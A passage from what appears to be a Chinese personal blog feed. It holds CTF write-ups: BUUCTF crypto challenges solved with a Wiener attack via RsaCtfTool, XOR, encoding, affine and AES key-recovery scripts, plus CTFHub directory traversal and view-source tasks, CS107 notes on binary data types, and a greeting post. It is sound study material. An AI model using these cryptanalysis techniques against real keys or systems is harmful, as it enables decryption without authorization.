8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span><span class="token comment"># n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从题目可以看出，其名称为 Small d，并给出了一个人名**<a href="https://en.wikipedia.org/wiki/Wiener%27s_attack">Michael J. Wiener</a>**，该攻击针对RSA，当d很小时，攻击使用连分数法来暴露私钥d。</p><p>我们直接用rsactftool脚本跑</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;RsaCtfTool&#x2F;RsaCtfTool<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">python3 RsaCtfTool.py -n 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433 -e 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825 --uncipher 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248 --attack wiener<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得出以下内容：</p><p><img src="image-20230928152305659.png" alt="image-20230928152305659"></p><p>所以 flag 为：<code>flag&#123;learn_some_continued_fraction_technique#dc16885c&#125;</code></p><h2 id="BUUCTF-Crypto-babyxor-task-3-简单的异或"><a href="#BUUCTF-Crypto-babyxor-task-3-简单的异或" class="headerlink" title="BUUCTF - Crypto babyxor  task_3 简单的异或"></a>BUUCTF - Crypto babyxor  task_3 简单的异或</h2><p>题目：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> secret <span class="token keyword">import</span> <span class="token operator">*</span>ciphertext <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> f <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    ciphertext<span class="token punctuation">.</span>append<span class="token punctuation">(</span>f <span class="token operator">^</span> key<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用在线转换工具将十六进制转换为二进制，得到前5个字符的二进制为：</p><pre class="line-numbers language-none"><code class="language-none">11101001 11100011 11101110 11101000 11110100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们可以猜测 前五个字母应该是 flag{，利用ASCII转二进制可以知道为：</p><pre class="line-numbers language-none"><code class="language-none">01100110 01101100 01100001 01100111 01111011<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>异或：</p><pre class="line-numbers language-none"><code class="language-none">10001111 10001111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以知道异或密钥为 10001111。然后先利用16进制转2进制网站，将密文转换为2进制；再利用异或在线解密将密文转换为明文；最后用2进制转换为ASCII码，得到正确答案，flag： <code>flag&#123;x0r_15_symm3try_and_e4zy!!!!!!&#125;</code></p><h2 id="BUUCTF-Crypto-babyencoding-task-3-txt"><a href="#BUUCTF-Crypto-babyencoding-task-3-txt" class="headerlink" title="BUUCTF - Crypto babyencoding task_3.txt"></a>BUUCTF - Crypto babyencoding task_3.txt</h2><p>题目如下所示：</p><pre class="line-numbers language-none"><code class="language-none">part 1 of flag: ZmxhZ3tkYXp6bGluZ19lbmNvZGluZyM0ZTBhZDQ&#x3D;part 2 of flag: MYYGGYJQHBSDCZJRMQYGMMJQMMYGGN3BMZSTIMRSMZSWCNY&#x3D;part 3 of flag: &#x3D;8S4U,3DR8SDY,C&#96;S-F5F-C(S,S&lt;R-C&#96;Q9F8S87T&#96;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>第一行就是Base64编码，解码得到：</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;dazzling_encoding#4e0ad4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二行使用Base64编码解码得到乱码：</p><pre class="line-numbers language-none"><code class="language-none">1?  ?P  ? ?Q1  0?P0?  ??1?? ?R1?? ?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>尝试使用Base32工具解码得到：</p><pre class="line-numbers language-none"><code class="language-none">f0ca08d1e1d0f10c0c7afe422fea7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第三行应该是 UUencode，解码后得到：</p><pre class="line-numbers language-none"><code class="language-none">c55192c992036ef623372601ff3a&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>把答案拼起来试试：</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果正确。</p><h2 id="BUUCTF-Crypto-Affine-task-2-Caesar-with-multiplication"><a href="#BUUCTF-Crypto-Affine-task-2-Caesar-with-multiplication" class="headerlink" title="BUUCTF - Crypto Affine  task_2 Caesar with multiplication"></a>BUUCTF - Crypto Affine  task_2 Caesar with multiplication</h2><p>题目如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flag <span class="token keyword">import</span> flag<span class="token punctuation">,</span> keymodulus <span class="token operator">=</span> <span class="token number">256</span>ciphertext <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> f <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    ciphertext<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span>f <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> modulus<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该题目为 <code>仿射</code>，提示是 <code>凯撒和乘法</code></p><p>先将密文前五位16进制转为10进制：</p><pre class="line-numbers language-none"><code class="language-none">221 67 136 238 66<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>根据 modulus 为 256，判断密文应该是对应的 扩展的ASCII 码。前五位字符原先应该是 <code>flag&#123;</code>，其所对应的十进制数为：</p><pre class="line-numbers language-none"><code class="language-none">102 108 97 103 123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行暴力破解，我们知道 k0的逆元 和 k1 的值一定不会大于 256：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">modulus <span class="token operator">=</span> <span class="token number">256</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">221</span><span class="token punctuation">,</span><span class="token number">67</span><span class="token punctuation">,</span><span class="token number">136</span><span class="token punctuation">,</span><span class="token number">238</span><span class="token punctuation">,</span><span class="token number">66</span><span class="token punctuation">]</span>   <span class="token comment">#密文</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> k0 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">257</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> k1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">257</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        y_ <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            y_<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>k0<span class="token operator">*</span><span class="token punctuation">(</span> x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> k1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> modulus<span class="token punctuation">)</span>        <span class="token keyword">if</span> y_ <span class="token operator">==</span> y<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'k0为:'</span><span class="token punctuation">,</span>k0<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'k1为:'</span><span class="token punctuation">,</span> k1<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'y_为'</span><span class="token punctuation">,</span>y_<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>破解结果为：</p><pre class="line-numbers language-none"><code class="language-none">k0的逆元 为: 241k1为: 23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>利用求逆元函数得到，k0为 17 （没有什么用了）</p><p>根据密文转化为10进制数带入上述式子，得到明文10进制数为：</p><pre class="line-numbers language-none"><code class="language-none">[102, 108, 97, 103, 123, 52, 102, 102, 49, 110, 101, 95, 99, 49, 112, 104, 101, 114, 95, 105, 53, 95, 118, 101, 114, 121, 95, 51, 97, 122, 121, 125]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再将其转化为ASCII码得到flag：<code>flag&#123;4ff1ne_c1pher_i5_very_3azy&#125;</code></p><h2 id="BUUCTF-Crypto-babyaes-task-1-了解下aes是什么"><a href="#BUUCTF-Crypto-babyaes-task-1-了解下aes是什么" class="headerlink" title="BUUCTF - Crypto babyaes  task_1 了解下aes是什么"></a>BUUCTF - Crypto babyaes  task_1 了解下aes是什么</h2><p>题目如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">import</span> os<span class="token keyword">from</span> flag <span class="token keyword">import</span> flag<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">pad</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> data <span class="token operator">+</span> <span class="token string">b""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">b'\x00'</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag_ <span class="token operator">=</span> pad<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span>    iv <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">^</span> bytes_to_long<span class="token punctuation">(</span>iv<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span>    aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>    enc_flag <span class="token operator">=</span> aes<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>flag_<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>enc_flag<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 3657491768215750635844958060963805125333761387746954618540958489914964573229</span><span class="token comment"># b'>]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该题目为AES加密，使用了一个密钥key和初始化向量iv，选择的CBC模式加密。</p><p>先分析一下题目中的几个关键函数和方法：</p><pre class="line-numbers language-none"><code class="language-none">urandom:语法  os.urandom（size）参数：size:字符串随机字节的大小返回值：该方法返回一个字符串，该字符串表示适合加密使用的随机字节。例 os.urandom(1)输出：b&#39;\x91&#39;二进制：10010001 （8bits）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">AES.new(key, mode, *args, **kwargs)param key(参数密钥):在对称密码中使用的秘密密钥。它必须为16、24或32个字节长（分别用于AES-128， AES-192或AES-256）。mode（模式）模式（支持的MODE_*常量之一）–用于加密或解密的链接模式。学习链接：https:&#x2F;&#x2F;pycryptodome.readthedocs.io&#x2F;en&#x2F;latest&#x2F;src&#x2F;cipher&#x2F;aes.htmlKeyword Arguments（关键字参数）：IV（字节，字节组，memoryview） - （只适用于MODE_CBC，MODE_CFB，MODE_OFB，和MODE_OPENPGP模式）。用于加密或解密的初始化向量。对于MODE_CBC，MODE_CFB和MODE_OFB它必须是16个字节。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解题思路：<br>解密 flag 我们需要获取到 key 和 iv 的值，由条件：<br>key&#x3D;os.urandom(16)*2<br>iv&#x3D;os.urandom(16)<br>可知：key是32bytes,256bits ；iv是16bytes ,128bits</p><p>key^iv ，那么只有 iv 与 key的低128位相异或，所以key的高128位是固定不变的。所以输出结果的高128bits,就是key的高128bits,进而可以得到key的所有值256bits。之后key的低128bits，与输出结果的低128bits 相异或，所得结果就是 iv的值了。key,iv得到后直接aes.decrypt()解密就ok了。<br>代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">import</span> os<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span><span class="token operator">*</span>xor <span class="token operator">=</span> <span class="token number">3657491768215750635844958060963805125333761387746954618540958489914964573229</span>enc_flag <span class="token operator">=</span> <span class="token string">b'>]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i'</span>out <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>xor<span class="token punctuation">)</span>key <span class="token operator">=</span> out<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">2</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'key为:'</span><span class="token punctuation">,</span>key<span class="token punctuation">)</span>iv <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span>bytes_to_long<span class="token punctuation">(</span>out<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># print(iv)</span>iv <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>iv<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'iv为:'</span><span class="token punctuation">,</span>iv<span class="token punctuation">)</span>aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span>AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span>iv<span class="token punctuation">)</span>flag <span class="token operator">=</span> aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>enc_flag<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行后得到：<code>b&#39;firsT_cry_Aes\x00\x00\x01&#39;</code>，其中 <code>firsT_cry_Aes</code> 是我们需要的内容，其余部分只是填充使字符串长度达到16。所以最终的flag为 <code>flag&#123;firsT_cry_Aes&#125;</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>目录遍历</title>
      <link href="/2023/09/20/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/"/>
      <url>/2023/09/20/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/</url>
      
        <content type="html"><![CDATA[<h1 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h1><p>打开题目可以看到如下页面，该题本质上就是遍历所有目录找取flag。目录数目不多，所以一个一个点击查找就可以找到。</p><p><img src="image-20230920084821330.png" alt="image-20230920084821330"></p><p>找到 <code>flag.txt</code> 文件</p><p><img src="image-20230920085047645.png" alt="image-20230920085047645"></p><p>打开得到 <code>flag</code> 为</p><pre class="line-numbers language-none"><code class="language-none">ctfhub&#123;bcd6fcf15f15f45dd0cf1a0c&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>斯坦福编程范式CS107_2</title>
      <link href="/2023/09/19/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_2/"/>
      <url>/2023/09/19/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_2/</url>
      
        <content type="html"><![CDATA[<h2 id="斯坦福编程范式CS107-2"><a href="#斯坦福编程范式CS107-2" class="headerlink" title="斯坦福编程范式CS107_2"></a>斯坦福编程范式CS107_2</h2><table><thead><tr><th><strong>C&#x2F;C++</strong></th><th align="left"></th></tr></thead><tbody><tr><td>bool</td><td align="left"></td></tr><tr><td>char</td><td align="left">1  byte</td></tr><tr><td>short</td><td align="left">2  bytes</td></tr><tr><td>int</td><td align="left">2–4 bytes</td></tr><tr><td>long</td><td align="left">4 bytes</td></tr><tr><td>long long</td><td align="left">8  bytes</td></tr><tr><td>float</td><td align="left">4  bytes</td></tr><tr><td>double</td><td align="left">8  bytes</td></tr></tbody></table><h4 id="1-为什么二进制中不简单的将-1-置在最左侧表示负数（如，-3为-1011）"><a href="#1-为什么二进制中不简单的将-1-置在最左侧表示负数（如，-3为-1011）" class="headerlink" title="1.为什么二进制中不简单的将 1 置在最左侧表示负数（如，-3为 1011）"></a>1.为什么二进制中不简单的将 1 置在最左侧表示负数（如，-3为 1011）</h4><p>因为如果是这样的话，-3 + 3将等于：</p><pre class="line-numbers language-none"><code class="language-none">1011 + 0011 &#x3D; 1110 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>显然结果是 -6 而不是 0。所以为了使正负数相加得到全0或全1，如：</p><pre class="line-numbers language-none"><code class="language-none">1100 + 0011 &#x3D; 1111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样得到全1后，我们只需要再 +1，就可以得到全0：</p><pre class="line-numbers language-none"><code class="language-none">1111 + 0001 &#x3D; (1)0000   这里的1越界了所以不算<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以实际上，我们采用 <strong>全部取反 并 +1</strong> 的方式用来表示负数： -3 （1101）.这种方法就叫做 <code>2补码</code></p><p>在 short 类型中，为了使 正数和负数 的数量一致，我们把最左边的那一比特空出，用于分割正数和负数，即正数最大为 $2^{15} -1 $：</p><pre class="line-numbers language-none"><code class="language-none">0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1   <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>负数最小是 $- 2^{15}$：</p><pre class="line-numbers language-none"><code class="language-none">1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-语言中变量间的相互赋值是如何实现的？"><a href="#2-语言中变量间的相互赋值是如何实现的？" class="headerlink" title="2.语言中变量间的相互赋值是如何实现的？"></a>2.语言中变量间的相互赋值是如何实现的？</h4><p>当我们运行如下程序的时候：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">char ch &#x3D; &#39;A&#39;;short s &#x3D; ch;cout &lt;&lt; s &lt;&lt; endl;------65<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在内存中就是这样进行的：(每一个格子代表1byte)，内存直接将<code>ch</code>的内容复制道<code>s</code>中。</p><table><thead><tr><th align="left">ch</th><th align="center"></th><th align="center">65</th></tr></thead><tbody><tr><td align="left">s</td><td align="center">0</td><td align="center">65</td></tr></tbody></table><p>如果运行如下程序时：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">short s &#x3D; 67;char ch &#x3D; s;cout &lt;&lt; ch &lt;&lt; endl;------C<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进行如上赋值操作时，16bit不能够被直接压缩成为8bit的模式。因而C和C++中会简单的只关注低位上的内容，而把高位内容直接丢弃。</p><p>如果进行如下程序时：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">short s &#x3D; -1;int i &#x3D; s;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>内存中所进行的操作是这样的：</p><table><thead><tr><th align="center">s</th><th align="center"></th><th align="center"></th><th align="center">1…1</th><th align="center">1…1</th></tr></thead><tbody><tr><td align="center">int</td><td align="center">1…1</td><td align="center">1…1</td><td align="center">1…1</td><td align="center">1…1</td></tr></tbody></table><p>这种操作被称为 “符号扩展”。会将 符号位一位一位向上复制，就会导致int的前两字节内全变为1，使得实际的数值仍然为 <code>-1</code></p><h5 id="3-浮点数float"><a href="#3-浮点数float" class="headerlink" title="3.浮点数float"></a>3.浮点数float</h5><p>对于浮点数float，其将整数范围缩小，节省下来的bit位用来表示 2的负次幂，这样就可以表示小数了。这是技术上可以实现的一种方式，但<code>实际上并不是这样</code>。</p><p> 实际上对于浮点数这样 4 byte 大小的数，浮点数将其中的 1 位用来表示符号，将其中的 8 位用来表示整数，剩下的 23 位用来表示小数。如下：</p><pre class="line-numbers language-none"><code class="language-none">s exp(8bit)xxxxxxxx(23bit)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么任何一个数都可以用如下形式进行表示：<br>$$<br>(-1)^S;1.xxxxxxxxx;×;2^{exp-127}     ;;;;;;(255≥exp≥0)<br>$$<br>例如，对于7.0，我们可以表示为：<br>$$<br>7.0×2^0\<br>3.5 ×2^1\<br>1.75×2^2<br>$$<br>总归是可以表示到如上的标准形式。</p><h5 id="4-整数与浮点数之间的赋值"><a href="#4-整数与浮点数之间的赋值" class="headerlink" title="4.整数与浮点数之间的赋值"></a>4.整数与浮点数之间的赋值</h5><p>如果有以下程序：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int i &#x3D; 5;float f &#x3D; i;cout &lt;&lt; f &lt;&lt; endl;----------    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这其中变化是这样的：</p><p>$5$ 被解释为 $5.0×2^0$ 随后又被解释为 $2.5×2^1$ 接着又被解释为 $1.25×2^2$. 因此 exp &#x3D; 129，xxx&#x3D;0.25。</p><p>如果有以下程序：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int i &#x3D; 37;float f &#x3D; *(float*)&amp;i; &#x2F;&#x2F; 对i的地址求值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>&amp;i 表示 i 的地址，i是int类型的数，因而 &amp;i 是 int * 类型的指针。</p><p>(float*)&amp;i 表示将 int * 类型 转变为了 float * 类型，bit位置不会发生改变，而因为 37 对应的 bit 位 都落在了 xxxxxx 的位置上，因而 exp &#x3D; 0，这就是一个奇小无比的数，而不是 37.0</p><p>如果有以下程序：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">float f &#x3D; 7.0;short s &#x3D; *(short *)&amp;f;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>float 是 4字节的数，指针指向 float 的最高位。当利用上述代码进行类型强制转换的时候，因为 short 只有2字节，因而 float 只有高位的两字节被直接复制过来，定义成了一个short类型的数。如下图所示：</p><p><img src="image-20230921091608188.png" alt="image-20230921091608188"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>WEB响应包源代码</title>
      <link href="/2023/09/19/WEB%E5%93%8D%E5%BA%94%E5%8C%85%E6%BA%90%E4%BB%A3%E7%A0%81/"/>
      <url>/2023/09/19/WEB%E5%93%8D%E5%BA%94%E5%8C%85%E6%BA%90%E4%BB%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFHub-响应包源代码"><a href="#CTFHub-响应包源代码" class="headerlink" title="CTFHub | 响应包源代码"></a>CTFHub | 响应包源代码</h1><p>题目网页显示的内容如下：</p><p><img src="test2.png" alt="test2"></p><p>打开源代码就可以找到答案：</p><p><img src="test1.png" alt="test1"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>我的第一篇博客</title>
      <link href="/2023/09/18/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2023/09/18/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>你好！</p><p>Hello！</p><p>Hallo！</p><p>こんにちわ‼</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/09/18/hello-world/"/>
